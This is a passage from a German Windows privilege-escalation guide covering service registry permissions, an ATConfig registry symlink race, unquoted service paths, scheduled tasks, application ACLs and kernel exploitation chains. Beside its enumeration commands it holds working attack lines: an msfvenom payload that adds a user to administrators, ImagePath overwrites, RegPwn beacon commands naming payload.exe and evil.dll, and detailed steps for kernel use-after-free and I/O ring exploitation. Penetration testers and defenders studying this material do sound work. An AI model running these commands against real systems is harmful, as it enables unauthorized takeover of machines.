Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst nicht von einem normalen Benutzer neu gestartet werden kann, prüfe, ob er beim Booten automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für Dienstregistrierungseinträge

Du solltest prüfen, ob du Dienstregistrierungseinträge ändern kannst.\
Du kannst deine **Berechtigungen** für eine **Dienstregistrierung** wie folgt **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Prüfen Sie, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** Schreibrechte für einen bestimmten Serviceschlüssel in der Registry haben. Ein ACL-Eintrag allein beweist keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen spielen ebenfalls eine Rolle. Die Rechte für Registry-Schlüssel sind von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Serviceobjekt getrennt. Eine Privilegieneskalation erfordert außerdem ein nutzbares Konfigurationsfeld des Service, eine Möglichkeit, den Service auszulösen, und eine privilegiertere Serviceidentität. Siehe Microsofts [Rechte für Registry-Schlüssel](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [Referenz zu Servicezugriffsrechten](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So ändern Sie den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebiges Schreiben von HKLM-Werten (ATConfig)

Einige Windows-Barrierefreiheitsfeatures erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Ein Registry-**Symbolic-Link-Race** kann diesen privilegierten Schreibvorgang auf **einen beliebigen HKLM-Pfad** umleiten und so eine Primitive zum **Schreiben beliebiger HKLM-Werte** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfeatures auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während der Anmeldung und beim Wechsel zum sicheren Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, den SYSTEM schreiben soll.
2. Löse das Kopieren für den sicheren Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne das Race**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Wenn das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du durch Überschreiben von Dienstkonfigurationswerten zu LPE übergehen:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibvorgang. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil des Race.

Beispiel-Tools (RegPwn BOF / Standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-Berechtigungen in der Dienstregistrierung

Wenn Sie diese Berechtigung für eine Registrierung haben, bedeutet das, dass **Sie daraus Unterschlüssel erstellen können**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Nicht in Anführungszeichen gesetzte Dienstpfade

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, alle möglichen Pfade bis zu jedem Leerzeichen auszuführen.

Zum Beispiel versucht Windows beim Pfad _C:\Program Files\Some Folder\Service.exe_, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle nicht in Anführungszeichen gesetzten Dienstpfade auf, ausgenommen solche, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Sie können** diese Schwachstelle mit metasploit **erkennen und ausnutzen**: `exploit/windows/local/trusted\_service\_path` Sie können manuell mit metasploit eine Service-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die bei einem Dienstausfall ausgeführt werden sollen. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise eine Privilegieneskalation möglich. Weitere Details finden sich in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ziele von Skripten geplanter Tasks

Prüfen Sie bei einem aktivierten Task, der `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das im **Aktionsargument** angegebene Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Wenn eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File` enthält, prüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachverfolgt werden. Ein Skript oder übergeordnetes Verzeichnis, in das der aufrufende Benutzer schreiben kann, ist nur dann ein Ansatzpunkt für eine kontoübergreifende Ausführung, wenn sich der konfigurierte Taskprinzipal vom aufrufenden Benutzer unterscheidet und der Task diese Aktion tatsächlich ausführt. Eine ACL, die nur das Anhängen von Inhalten erlaubt, kann bei Skripten relevant sein, aber ein vorheriges `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen unerreichbar machen. Bestätigen Sie die effektiven ACLs, den [Ausführungskontext des Tasks](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungssteuerung, bevor Sie eine Privilegieneskalation behaupten. Bei der Bestandsaufnahme dürfen weder das Skript geändert noch der Task gestartet werden.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie für eine kleine, relevante Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen; Windows stellt diese über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShells [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie die effektiven Leseberechtigungen der Datei, die Stream-Unterstützung des Dateisystems, ob der Stream verwendbare Anmeldedaten enthält und bei welchem Konto diese tatsächlich zur Authentifizierung verwendet werden. Vermeiden Sie bei routinemäßigen Aufzählungen rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingaben des geplanten Windows Driver Kit-Hilfsprogramms

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` aus seinem Ausführungsverzeichnis verwenden kann. Ein geplanter Task oder Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit geringen Berechtigungen auf diese Eingaben in eine Befehlsausführung im Kontext dieses Kontos umwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Prüfen Sie, ob es einen privilegierten Verbraucher gibt und ob **beide** Begleitdateien erstellt oder geändert werden können; das Auffinden des Hilfsprogramms allein reicht nicht aus.

Prüfen Sie bei einem geplanten Task dessen Aktionseigenschaft [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) und die ACLs der beiden Begleitdateipfade. Gibt der Task kein Arbeitsverzeichnis an, ist das Verzeichnis der ausführbaren Datei lediglich ein zu überprüfender Ansatzpunkt und kein Nachweis dafür, wo der Task seine Eingaben liest. Auch die Voraussetzung der Projektarbeitsdatei muss erfüllt sein. Prüfen Sie den tatsächlichen Taskprinzipal, statt anzunehmen, dass der Task als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (möglicherweise können Sie eine davon überschreiben und Ihre Berechtigungen erweitern) sowie der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Reparaturpfad des Checkmk-Windows-Agenten

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` schrieben und dann eine bereits vorhandene schreibgeschützte Datei ausführten, wenn das Ersetzen fehlschlug. Der Hersteller behob das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1. Prüfe den vollständigen installierten Patchlevel und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine reine Angabe des Zweigs wie `2.1` reicht nicht aus, um eine Betroffenheit festzustellen. Bei der Enumeration lassen sich Version, Dienststatus und Temp-Berechtigungen prüfen, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus bis einschließlich Build 6210; der Hersteller behob das Problem in Build 6211. Die Schwachstelle ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein Eintrag für ein installiertes Produkt oder ein Dienstpfad ist daher ein Hinweis, aber kein Beleg für eine Schwachstelle: Bestätige den genauen Build, den Verlauf der SAML-Konfiguration, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Die Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM setzt voraus, dass die Instanz als SYSTEM läuft. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, kein Beleg für verwendbare Zugangsdaten oder diese SAML-Schwachstelle. Notiere Pfad und Zugriffsrechte, ohne die Datei bei der routinemäßigen Enumeration zu entpacken.

#### Jenkins-Controller und Grenzen von Domänenkonten

Unterscheide auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als getrennte Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Starten eines Builds bieten; bestätige jedoch, dass er aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agenten, und gespeicherte Zugangsdaten sind nur verwendbar, wenn der Job auf deren Gültigkeitsbereich zugreifen kann. Prüfe separat den Zugriff auf die Metadaten von `JENKINS_HOME`: Jenkins speichert Zugangsdaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Speicherung von Geheimnissen](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr Vorhandensein allein legt kein Passwort offen; prüfe den **Lesezugriff auf die erforderlichen Dateien** und einen davon unabhängigen Pfad zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzten Ausgaben auszugeben. Hat dieses Konto ein Schreibrecht auf `scriptPath` des AD-Benutzerobjekts, bestätige einen beschreibbaren Skriptpfad sowie einen tatsächlichen Anmelde- oder geplanten Vorgang, der als Zielbenutzer ausgeführt wird, bevor du dies als kontenübergreifende Ausführung einstufst. Weitere Kontrolle über Gruppen setzt eine separate Prüfung der effektiven AD-Rechte voraus.

#### Identität eines selbstgehosteten Azure-Pipelines-Agenten

Unterscheide bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, der Berechtigung, sie **in die Warteschlange zu stellen**, und der Berechtigung, den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [die Autorisierung von Pools](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Kann ein Konto mit geringeren Berechtigungen einen Skriptschritt übermitteln und diese Pipeline auf einem selbstgehosteten Windows-Agenten ausführen, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agenten](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Prüfe die genaue Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, einen ausführbaren Job und die Dienstidentität des Agenten, bevor du einen Wechsel zu einem anderen Benutzerkonto oder zu SYSTEM behauptest. Ein installierter Agent, eine Projektrolle oder Schreibzugriff auf ein Repository sind für sich genommen nur Hinweise; prüfe Berechtigungen und lokale Dienstmetadaten, ohne bei der passiven Enumeration einen Build zu starten.

#### Microsoft Entra Connect Sync-Zugangsdaten

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, unter dem der Synchronisierungsdienst läuft und das auf dessen SQL-Datenbank zugreift, und dem **AD DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Connector-Zugangsdaten werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte schließen lässt, oder allein die Sichtbarkeit der Datenbank belegen weder entschlüsselbare Zugangsdaten noch eine Rechteausweitung in der Domäne. Prüfe separat die tatsächlichen Datenbank-Leserechte, den Zugriff auf das Dienstkonto und die Schlüssel, das Installations- und SQL-Layout, die konfigurierte Connector-Identität sowie deren effektive AD-Berechtigungen. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsmetadaten angezeigt werden, nicht die gespeicherten Geheimnisse abgefragt oder ausgegeben werden.

#### Berechtigungen für Support-DLLs von Druckertreibern

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` ablegen und sie in einem privilegierteren Druckprozess laden. Prüfe die ACLs des genauen Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, selbst wenn die WMI-Enumeration des Druckers verweigert wird. Beim [Problem mit dem Ricoh-Druckertreiber CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der angegebene Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Hinweis: Prüfe den effektiven Schreibzugriff nach Berücksichtigung von Deny-Einträgen, ob der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt, sowie ob der Hersteller das Problem durch einen aktualisierten Treiber oder ein Sicherheitsprogramm behoben hat. Leite eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei so ändern kannst, dass eine spezielle Datei ausgelesen wird, oder ob du eine Binärdatei ändern kannst, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/Ausführung

Notepad++ lädt automatisch jede Plugin-DLL in seinen Unterordnern `plugins`. Wenn eine beschreibbare portable/Kopie-Installation vorhanden ist, führt das Ablegen eines schädlichen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (einschließlich über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du eine Registry oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autoruns-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **seltsamen/verwundbaren Treibern von Drittanbietern**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine beliebige Kernel-Lese-/Schreibprimitive bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Rechte erweitern, indem du direkt ein SYSTEM-Token aus dem Kernelspeicher stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Anleitung findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Weiteres Material zur Windows-Kernel-Exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Fehlern, bei denen der anfällige Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, lässt sich das Zeitfenster durch absichtliches Verlangsamen der Suche (mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnissen) von Mikrosekunden auf mehrere zehn Mikrosekunden vergrößern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe-Queue-UAFs, Paged-Pool-Offenlegungen und I/O-Ring-Pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Fehlern aufbauen: einer **Lifetime-Race in einer cancel-safe queue**, die eine Anfrage/CBD freigibt, während die Queue-Sperre noch gehalten wird, und einer Offenlegung durch **Freigabe der Sperre vor dem Kopieren**, bei der während `RtlCopyToUser` eine freigegebene Paged-Pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zur Analyse und Exploitation:

- **Freigabe unter Sperre + anschließendes Cancel**: Suche nach einem Erfolgs-Pfad mit **Acquire -> CompleteRequest/free -> Release**, während der Cancel-Pfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgs-Pfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` aufruft, bevor er die CBDQ/CSQ-Sperre freigibt, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Das freigegebene Queue-Objekt zurückgewinnen** durch eine gleich große, vom Angreifer kontrollierte Paged-Pool-Allokation. `NPFS` Data Queue Entries sind nützlich, da Payload und Größe kontrollierbar sind und du sie später mit Pipe-Read-/Peek-Operationen untersuchen kannst. Wenn das freigegebene Objekt Listeneinträge enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Anfrageknoten im User-Speicher**, sodass der Treiber wiederholt vom Angreifer definierte Anfragestrukturen verarbeitet, anstatt am ursprünglichen Listenanfang zu enden.
- **Einen vorhersagbaren Schreibvorgang aufwerten**: Wenn die gefälschte Anfrage einen verschachtelten Kontextzeiger umleitet, der für Buchhaltungsschreibvorgänge verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Schreibvorgang. Ziele in diesem Fall das **Längen-/Größenfeld** eines gesprayten Pool-Objekts statt eines Code-/Datenzeigers, und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Paged-Pool-Lesezugriff** ermöglicht.
- **Muster für Race-ausnutzbare Offenlegung**: Jeder Systemaufruf nach dem Muster `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein aussichtsreicher Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Puffer vergrößern kann (etwa durch das Hinzufügen vieler Listen-/Ressourceneinträge, die die endgültige Allokationsgröße eines Serializers erhöhen), da der längere Kopiervorgang das Ersetzungsfenster vergrößert, ohne zwangsläufig einen Systemabsturz zu verursachen.
- **Refill-Ziele mit vielen Zeigern**: Registrierte Puffer-Arrays von Windows-**I/O-Rings** eignen sich hervorragend als Offenlegungsziele, da ihre Paged-Pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Zeiger auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays, ermittle das umgebende `IORING_OBJECT` und korrumpiere dann **`RegBuffers`** und **`RegBuffersCount`**, sodass nachfolgende I/O-Ring-Operationen gefälschte Einträge des Angreifers verwenden und beliebige Kernel-Lese-/Schreibzugriffe ermöglichen. Wenn der einzig verfügbare Schreibvorgang dir ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Schreibvorgänge**, um einen User-Zeiger aus wiederholten Bytes wie `0x0101010101010101` zu erzeugen, ordne ihn mit `VirtualAlloc` zu und platziere das gefälschte Array registrierter Puffer dort.<sup>[[30]](#references)</sup>

Nützliche Debugging-Indikatoren:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du über den beschädigten I/O ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehlst du mit dem standardmäßigen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Beschädigung des Registry-Hive-Speichers

Moderne Hive-Schwachstellen ermöglichen es, deterministische Speicherlayouts gezielt vorzubereiten, beschreibbare HKLM-/HKU-Nachfolger auszunutzen und Metadatenbeschädigung ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Hier findest du die vollständige Angriffskette:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Typverwechslung im Direct-Modus von `RtlQueryRegistryValues` durch vom Angreifer kontrollierte Pfade

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` für einen skalaren Wert auf dem Stack wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` anhand des **tatsächlichen** Registry-Typs interpretiert und nicht anhand des vom Entwickler erwarteten Typs.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer ausgewählte Schlüssel abzufragen, deren Existenz über Rückgabecodes/Logs preiszugeben und manchmal Werte zu lesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherbeschädigung**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder größenabhängiger Binärpuffer fehlinterpretiert.

Hinweise zur praktischen Ausnutzung:

- **Windows-8+-Mitigation**: Trifft die Abfrage auf einen **nicht vertrauenswürdigen Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln innerhalb vertrauenswürdiger System-Hives**, statt Werte unter `HKCU` abzulegen.
- **Bereitstellung in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare Nachfolger von `\Registry\Machine` aufzulisten, und wiederhole den Scan mit einem duplizierten **Low-Integrity-Token**, um Schlüssel zu finden, die aus Sandbox-Kontexten erreichbar sind:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibzugriff über 8 Byte in einen 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im direkten Modus wird erwartet, dass `EntryContext` auf eine `UNICODE_STRING` zeigt. Lädt der Code zunächst einen vom Angreifer kontrollierten `REG_DWORD` in einen Stack-Skalar und verwendet denselben Puffer anschließend erneut für einen String-Lesezugriff, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst teilweise den `Buffer`-Zeiger. Das ermöglicht einen teilweise kontrollierten Kernel-Schreibzugriff.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der direkte Modus den ersten `LONG` bei `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesezugriff einen **negativen**, vom Angreifer kontrollierten Wert im wiederverwendeten Skalar, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Das ist oft der einfachste Weg, einen Callback-Zeiger vollständig zu überschreiben.

